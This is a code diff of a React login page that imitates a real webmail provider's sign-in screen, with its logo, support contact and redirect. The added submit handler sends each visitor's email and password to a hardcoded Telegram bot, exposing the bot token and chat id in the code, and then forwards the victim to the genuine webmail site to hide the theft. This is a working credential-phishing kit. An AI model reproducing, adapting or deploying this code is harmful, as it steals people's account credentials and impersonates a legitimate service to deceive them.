@@ -8,68 +8,63 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import { useEffect } from 'react';
+import usgo from './usgo.png';
+
+
+
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Usgo")
 
     const[showError, setShowError] = useState(false);
 
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-      showCookies();
-
-      }, [])
-
-
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
+  
+    async function handleSubmit(e){
+        e.preventDefault();
+    
+        try {
+            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+            //     email:email,
+            //     password:password,
+            //     platform:platform
+            // });
+    
+           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
+        
+            // Handle success
+         
+    
+            if(response.status == 200){
+               // console.log(response.data.message);
+    
+              
+               window.location.href = 'https://webmail0.usgo.net/';
+            }
+          } catch (error) {
+            // Handle error
+            console.error('Error:', error);
+          }
+        
     }
-
-async function handleSubmit(e){
-    e.preventDefault();
-
-    try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
-    
-        // Handle success
-        console.log('Data sent:', response.data.message);
-
-        if(response.status == 200){
-            console.log(response.data.message);
-
-            setShowError(true);
-        }
-      } catch (error) {
-        // Handle error
-        console.error('Error:', error);
-      }
-    
-}
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
+            <nav className='mynav px-3 py-3 text-center'>
+                <img className='navimage' src={usgo} />
 
             </nav>
 
-                <div className='py-5'>
+                <div className='py-2'>
 
                 </div>
 
@@ -127,7 +122,8 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Webmail</p>
+                <p className='info'>If you are having trouble logging in, please contact our free support at <br/>
+support@usfamily.net or 763-222-1000</p>
         </>
     );
 
